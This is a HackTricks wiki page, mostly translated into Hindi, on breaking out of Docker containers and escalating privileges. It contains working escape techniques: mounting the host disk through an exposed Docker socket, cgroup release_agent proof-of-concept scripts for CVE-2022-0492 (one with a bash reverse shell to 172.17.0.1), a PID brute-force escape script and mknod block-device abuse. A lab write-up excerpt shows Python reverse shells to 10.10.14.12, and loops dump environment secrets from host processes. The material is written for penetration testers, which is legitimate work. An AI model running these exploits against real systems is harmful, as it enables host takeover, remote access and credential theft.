# Docker Breakout / Privilege Escalation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=docker-breakout-privilege-escalation" %}

## Automatic Enumeration & Escape

* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): यह भी **कंटेनरों की सूची बना सकता है**
* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): यह उपकरण **कंटेनर की सूची बनाने के लिए काफी उपयोगी है जिसमें आप हैं और यहां तक कि स्वचालित रूप से भागने की कोशिश करें**
* [**amicontained**](https://github.com/genuinetools/amicontained): यह उपकरण कंटेनर के पास मौजूद विशेषाधिकारों को प्राप्त करने के लिए उपयोगी है ताकि इससे भागने के तरीके खोजे जा सकें
* [**deepce**](https://github.com/stealthcopter/deepce): कंटेनरों से सूची बनाने और भागने के लिए उपकरण
* [**grype**](https://github.com/anchore/grype): छवि में स्थापित सॉफ़्टवेयर में शामिल CVEs प्राप्त करें

## Mounted Docker Socket Escape

यदि किसी तरह आप पाते हैं कि **डॉकर सॉकेट कंटेनर के अंदर माउंट किया गया है**, तो आप इससे भागने में सक्षम होंगे।\
यह आमतौर पर उन डॉकर कंटेनरों में होता है जिन्हें किसी कारणवश कार्य करने के लिए डॉकर डेमन से कनेक्ट करने की आवश्यकता होती है।
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
इस मामले में आप docker डेमन के साथ संवाद करने के लिए नियमित docker कमांड का उपयोग कर सकते हैं:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
{% hint style="info" %}
यदि **docker socket एक अप्रत्याशित स्थान पर है** तो आप **`docker`** कमांड का उपयोग करके इसे **`-H unix:///path/to/docker.sock`** पैरामीटर के साथ संचारित कर सकते हैं।
{% endhint %}

Docker डेमन भी [एक पोर्ट पर सुन सकता है (डिफ़ॉल्ट रूप से 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) या Systemd-आधारित सिस्टम पर, Docker डेमन के साथ संचार Systemd socket `fd://` के माध्यम से हो सकता है।

{% hint style="info" %}
इसके अतिरिक्त, अन्य उच्च-स्तरीय रंटाइम के रनटाइम सॉकेट पर ध्यान दें:

* dockershim: `unix:///var/run/dockershim.sock`
* containerd: `unix:///run/containerd/containerd.sock`
* cri-o: `unix:///var/run/crio/crio.sock`
* frakti: `unix:///var/run/frakti.sock`
* rktlet: `unix:///var/run/rktlet.sock`
* ...
{% endhint %}

## क्षमताओं का दुरुपयोग बचाव

आपको कंटेनर की क्षमताओं की जांच करनी चाहिए, यदि इसमें निम्नलिखित में से कोई भी है, तो आप इससे बाहर निकलने में सक्षम हो सकते हैं: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

आप **पहले उल्लेखित स्वचालित उपकरणों** का उपयोग करके वर्तमान कंटेनर क्षमताओं की जांच कर सकते हैं या:
```bash
capsh --print
```
इस पृष्ठ पर आप **लिनक्स क्षमताओं के बारे में अधिक जान सकते हैं** और उन्हें कैसे दुरुपयोग करके विशेषाधिकारों से बचने/वृद्धि करने के लिए उपयोग कर सकते हैं:

{% content-ref url="../../linux-capabilities.md" %}
[linux-capabilities.md](../../linux-capabilities.md)
{% endcontent-ref %}

## विशेषाधिकार प्राप्त कंटेनरों से बचना

एक विशेषाधिकार प्राप्त कंटेनर को `--privileged` ध्वज के साथ या विशिष्ट सुरक्षा उपायों को निष्क्रिय करके बनाया जा सकता है:

* `--cap-add=ALL`
* `--security-opt apparmor=unconfined`
* `--security-opt seccomp=unconfined`
* `--security-opt label:disable`
* `--pid=host`
* `--userns=host`
* `--uts=host`
* `--cgroupns=host`
* `Mount /dev`

`--privileged` ध्वज कंटेनर की सुरक्षा को काफी कम कर देता है, **असीमित डिवाइस पहुंच** प्रदान करता है और **कई सुरक्षा उपायों** को बायपास करता है। इसके पूर्ण प्रभावों के लिए, `--privileged` पर दस्तावेज़ देखें।

{% content-ref url="../docker-privileged.md" %}
[docker-privileged.md](../docker-privileged.md)
{% endcontent-ref %}

### विशेषाधिकार प्राप्त + hostPID

इन अनुमतियों के साथ आप बस **रूट के रूप में होस्ट में चल रहे एक प्रक्रिया के नामस्थान में जा सकते हैं** जैसे init (pid:1) बस चलाकर: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

इसे एक कंटेनर में परीक्षण करें:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### Privileged

केवल प्रिविलेज्ड फ्लैग के साथ आप **होस्ट के डिस्क** तक पहुँचने की कोशिश कर सकते हैं या **release\_agent या अन्य एस्केप्स का दुरुपयोग करके भागने** की कोशिश कर सकते हैं।

कंटेनर में निम्नलिखित बायपास का परीक्षण करें:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### Mounting Disk - Poc1

अच्छी तरह से कॉन्फ़िगर किए गए डॉकर कंटेनर **fdisk -l** जैसे कमांड की अनुमति नहीं देंगे। हालाँकि, गलत कॉन्फ़िगर किए गए डॉकर कमांड पर जहाँ `--privileged` या `--device=/dev/sda1` फ्लैग बड़े अक्षरों में निर्दिष्ट किया गया है, होस्ट ड्राइव को देखने के लिए विशेषाधिकार प्राप्त करना संभव है।

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

तो होस्ट मशीन पर नियंत्रण पाने के लिए, यह तुच्छ है:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
And voilà ! आप अब होस्ट की फ़ाइल प्रणाली तक पहुँच सकते हैं क्योंकि यह `/mnt/hola` फ़ोल्डर में माउंट किया गया है।

#### Mounting Disk - Poc2

कंटेनर के भीतर, एक हमलावर होस्ट OS तक और अधिक पहुँच प्राप्त करने का प्रयास कर सकता है जो क्लस्टर द्वारा बनाए गए writable hostPath वॉल्यूम के माध्यम से है। नीचे कुछ सामान्य चीजें हैं जिन्हें आप कंटेनर के भीतर जांच सकते हैं कि क्या आप इस हमलावर वेक्टर का लाभ उठा सकते हैं:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### विशेषाधिकार से बचना मौजूदा release\_agent का दुरुपयोग ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1

{% code title="प्रारंभिक PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
{% endcode %}

#### विशेषाधिकार से बचना बनाए गए release\_agent का दुरुपयोग ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2

{% code title="दूसरा PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% endcode %}

एक **तकनीक का विवरण** खोजें:

{% content-ref url="docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

#### प्रिविलेज़्ड एस्केप बिना ज्ञात सापेक्ष पथ के release\_agent का दुरुपयोग - PoC3

पिछले हमलों में **होस्ट के फाइल सिस्टम के अंदर कंटेनर का पूर्ण पथ प्रकट होता है**। हालाँकि, यह हमेशा ऐसा नहीं होता। उन मामलों में जहाँ आप **होस्ट के अंदर कंटेनर का पूर्ण पथ नहीं जानते** आप इस तकनीक का उपयोग कर सकते हैं:

{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
प्रिविलेज्ड कंटेनर के भीतर PoC को निष्पादित करने से निम्नलिखित के समान आउटपुट मिलना चाहिए:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### Privileged Escape Abusing Sensitive Mounts

कुछ फ़ाइलें हैं जो माउंट की जा सकती हैं जो **अंडरलेइंग होस्ट के बारे में जानकारी देती हैं**। इनमें से कुछ यह भी संकेत दे सकती हैं कि **जब कुछ होता है तो होस्ट द्वारा कुछ निष्पादित किया जाना है** (जो एक हमलावर को कंटेनर से बाहर निकलने की अनुमति देगा)।\
इन फ़ाइलों का दुरुपयोग करने से यह संभव हो सकता है:

* release\_agent (पहले ही कवर किया गया)
* [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
* [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
* [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
* [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

हालांकि, आप इस पृष्ठ पर **अन्य संवेदनशील फ़ाइलें** जांचने के लिए पा सकते हैं:

{% content-ref url="sensitive-mounts.md" %}
[sensitive-mounts.md](sensitive-mounts.md)
{% endcontent-ref %}

### Arbitrary Mounts

कई अवसरों पर आप पाएंगे कि **कंटेनर में होस्ट से कुछ वॉल्यूम माउंट किया गया है**। यदि यह वॉल्यूम सही तरीके से कॉन्फ़िगर नहीं किया गया है, तो आप **संवेदनशील डेटा तक पहुँच/संशोधित** कर सकते हैं: रहस्यों को पढ़ें, ssh authorized\_keys को बदलें…
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### Privilege Escalation with 2 shells and host mount

यदि आपके पास **कंटेनर के अंदर रूट के रूप में पहुंच** है जिसमें होस्ट से कुछ फ़ोल्डर माउंट किया गया है और आपने **गैर-विशेषाधिकार प्राप्त उपयोगकर्ता के रूप में होस्ट पर भाग लिया है** और माउंट किए गए फ़ोल्डर पर पढ़ने की पहुंच है।\
आप **कंटेनर** के अंदर **माउंट किए गए फ़ोल्डर** में एक **bash suid फ़ाइल** बना सकते हैं और **होस्ट से इसे निष्पादित** करके प्रिवेस्क कर सकते हैं।
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### Privilege Escalation with 2 shells

यदि आपके पास **कंटेनर के अंदर रूट के रूप में पहुंच** है और आपने **होस्ट पर गैर-विशिष्ट उपयोगकर्ता के रूप में भाग लिया है**, तो आप **होस्ट के अंदर प्रिवेस्क करने के लिए दोनों शेल का दुरुपयोग कर सकते हैं** यदि आपके पास कंटेनर के अंदर MKNOD की क्षमता है (यह डिफ़ॉल्ट रूप से है) जैसा कि [**इस पोस्ट में समझाया गया है**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)।\
इस तरह की क्षमता के साथ कंटेनर के भीतर रूट उपयोगकर्ता को **ब्लॉक डिवाइस फ़ाइलें बनाने** की अनुमति है। डिवाइस फ़ाइलें विशेष फ़ाइलें होती हैं जो **नीचे के हार्डवेयर और कर्नेल मॉड्यूल्स तक पहुंचने के लिए उपयोग की जाती हैं**। उदाहरण के लिए, /dev/sda ब्लॉक डिवाइस फ़ाइल **सिस्टम के डिस्क पर कच्चे डेटा को पढ़ने** की पहुंच देती है।

Docker कंटेनरों के भीतर ब्लॉक डिवाइस के दुरुपयोग के खिलाफ सुरक्षा करता है एक cgroup नीति को लागू करके जो **ब्लॉक डिवाइस पढ़ने/लिखने के संचालन को रोकती है**। फिर भी, यदि एक ब्लॉक डिवाइस **कंटेनर के अंदर बनाया गया है**, तो यह कंटेनर के बाहर **/proc/PID/root/** निर्देशिका के माध्यम से सुलभ हो जाता है। इस पहुंच के लिए **प्रक्रिया के मालिक का एक जैसा होना आवश्यक है** कंटेनर के अंदर और बाहर दोनों।

**शोषण** का उदाहरण इस [**लेख**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/) से:
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

यदि आप होस्ट की प्रक्रियाओं तक पहुँच सकते हैं, तो आप उन प्रक्रियाओं में संग्रहीत बहुत सारी संवेदनशील जानकारी तक पहुँचने में सक्षम होंगे। परीक्षण प्रयोगशाला चलाएँ:
```
docker run --rm -it --pid=host ubuntu bash
```
उदाहरण के लिए, आप `ps auxn` जैसे कुछ का उपयोग करके प्रक्रियाओं की सूची बना सकेंगे और कमांड में संवेदनशील विवरणों की खोज कर सकेंगे।

फिर, क्योंकि आप **/proc/ में मेज़बान की प्रत्येक प्रक्रिया तक पहुँच सकते हैं, आप बस उनके env secrets चुरा सकते हैं**:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
आप अन्य प्रक्रियाओं के फ़ाइल डिस्क्रिप्टर्स तक भी **पहुँच सकते हैं और उनके खुले फ़ाइलों को पढ़ सकते हैं**:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
आप **प्रक्रियाओं को समाप्त कर सकते हैं और DoS का कारण बन सकते हैं**।

{% hint style="warning" %}
यदि आपके पास किसी तरह **कंटेनर के बाहर एक प्रक्रिया पर विशेषाधिकार प्राप्त पहुंच** है, तो आप कुछ ऐसा चला सकते हैं जैसे `nsenter --target <pid> --all` या `nsenter --target <pid> --mount --net --pid --cgroup` ताकि आप **उस प्रक्रिया के समान ns प्रतिबंधों के साथ एक शेल चला सकें** (उम्मीद है कि कोई नहीं)।
{% endhint %}

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
यदि एक कंटेनर को Docker [होस्ट नेटवर्किंग ड्राइवर (`--network=host`)](https://docs.docker.com/network/host/) के साथ कॉन्फ़िगर किया गया था, तो उस कंटेनर का नेटवर्क स्टैक Docker होस्ट से अलग नहीं है (कंटेनर होस्ट के नेटवर्किंग नामस्थान को साझा करता है), और कंटेनर को अपना IP-पता आवंटित नहीं किया जाता है। दूसरे शब्दों में, **कंटेनर सभी सेवाओं को सीधे होस्ट के IP पर बाइंड करता है**। इसके अलावा, कंटेनर **सभी नेटवर्क ट्रैफ़िक को इंटरसेप्ट कर सकता है जो होस्ट** साझा इंटरफेस `tcpdump -i eth0` पर भेज और प्राप्त कर रहा है।

उदाहरण के लिए, आप इसका उपयोग **होस्ट और मेटाडेटा इंस्टेंस के बीच ट्रैफ़िक को स्निफ़ और यहां तक कि स्पूफ करने** के लिए कर सकते हैं।

जैसे कि निम्नलिखित उदाहरणों में:

* [Writeup: How to contact Google SRE: Dropping a shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
* [Metadata service MITM allows root privilege escalation (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

आप **होस्ट के अंदर लोकलहोस्ट पर बाइंड की गई नेटवर्क सेवाओं** तक भी पहुंच सकते हैं या यहां तक कि **नोड के मेटाडेटा अनुमतियों** तक पहुंच सकते हैं (जो कि उन अनुमतियों से भिन्न हो सकते हैं जिन तक एक कंटेनर पहुंच सकता है)।

### hostIPC
```bash
docker run --rm -it --ipc=host ubuntu bash
```
`hostIPC=true` के साथ, आपको होस्ट के इंटर-प्रोसेस संचार (IPC) संसाधनों, जैसे कि **शेयर की गई मेमोरी** में `/dev/shm` तक पहुंच मिलती है। यह पढ़ने/लिखने की अनुमति देता है जहां समान IPC संसाधनों का उपयोग अन्य होस्ट या पॉड प्रक्रियाओं द्वारा किया जाता है। इन IPC तंत्रों की और जांच करने के लिए `ipcs` का उपयोग करें।

* **/dev/shm का निरीक्षण करें** - इस साझा मेमोरी स्थान में किसी भी फ़ाइल की तलाश करें: `ls -la /dev/shm`
* **मौजूदा IPC सुविधाओं का निरीक्षण करें** – आप देख सकते हैं कि क्या कोई IPC सुविधाएँ उपयोग में हैं `/usr/bin/ipcs` के साथ। इसे जांचें: `ipcs -a`

### क्षमताएँ पुनर्प्राप्त करें

यदि syscall **`unshare`** निषिद्ध नहीं है, तो आप सभी क्षमताओं को पुनर्प्राप्त कर सकते हैं:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### उपयोगकर्ता नामस्थान का दुरुपयोग सिम्लिंक के माध्यम से

पोस्ट [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) में समझाई गई दूसरी तकनीक बताती है कि आप उपयोगकर्ता नामस्थान के साथ बाइंड माउंट्स का दुरुपयोग कैसे कर सकते हैं, ताकि होस्ट के अंदर फ़ाइलों को प्रभावित किया जा सके (उस विशेष मामले में, फ़ाइलों को हटाना)।

<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) का उपयोग करें ताकि आप दुनिया के **सबसे उन्नत** सामुदायिक उपकरणों द्वारा संचालित **कार्यप्रवाहों** को आसानी से बना और **स्वचालित** कर सकें।\
आज ही एक्सेस प्राप्त करें:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=docker-breakout-privilege-escalation" %}

## CVEs

### Runc शोषण (CVE-2019-5736)

यदि आप `docker exec` को रूट के रूप में निष्पादित कर सकते हैं (संभवतः sudo के साथ), तो आप CVE-2019-5736 का दुरुपयोग करते हुए कंटेनर से बाहर निकलकर विशेषाधिकार बढ़ाने की कोशिश करते हैं (शोषण [यहां](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go) )। यह तकनीक मूल रूप से **होस्ट** के _**/bin/sh**_ बाइनरी को **कंटेनर** से **ओवरराइट** करेगी, इसलिए कोई भी जो docker exec निष्पादित करता है, वह पेलोड को ट्रिगर कर सकता है।

पेलोड को तदनुसार बदलें और `go build main.go` के साथ main.go बनाएं। परिणामी बाइनरी को निष्पादन के लिए डॉकर कंटेनर में रखा जाना चाहिए।\
निष्पादन के बाद, जैसे ही यह `[+] Overwritten /bin/sh successfully` प्रदर्शित करता है, आपको होस्ट मशीन से निम्नलिखित निष्पादित करना होगा:

`docker exec -it <container-name> /bin/sh`

यह पेलोड को ट्रिगर करेगा जो main.go फ़ाइल में मौजूद है।

अधिक जानकारी के लिए: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
कंटेनर अन्य CVEs के प्रति भी संवेदनशील हो सकता है, आप [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list) में एक सूची पा सकते हैं।
{% endhint %}

## डॉकर कस्टम एस्केप

### डॉकर एस्केप सतह

* **नामस्थान:** प्रक्रिया को अन्य प्रक्रियाओं से **पूर्ण रूप से अलग** होना चाहिए, इसलिए हम नामस्थान के कारण अन्य प्रॉक्स के साथ बातचीत करते समय बाहर नहीं निकल सकते (डिफ़ॉल्ट रूप से IPCs, यूनिक्स सॉकेट, नेटवर्क सेवाओं, D-Bus, `/proc` अन्य प्रॉक्स के माध्यम से संवाद नहीं कर सकते)।
* **रूट उपयोगकर्ता**: डिफ़ॉल्ट रूप से प्रक्रिया चलाने वाला उपयोगकर्ता रूट उपयोगकर्ता है (हालांकि इसके विशेषाधिकार सीमित हैं)।
* **क्षमताएँ**: डॉकर निम्नलिखित क्षमताएँ छोड़ता है: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
* **सिस्टम कॉल**: ये सिस्टम कॉल हैं जिन्हें **रूट उपयोगकर्ता नहीं बुला सकेगा** (क्षमताओं की कमी + Seccomp के कारण)। अन्य सिस्टम कॉल का उपयोग बाहर निकलने की कोशिश करने के लिए किया जा सकता है।

{% tabs %}
{% tab title="x64 syscalls" %}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{% endtab %}

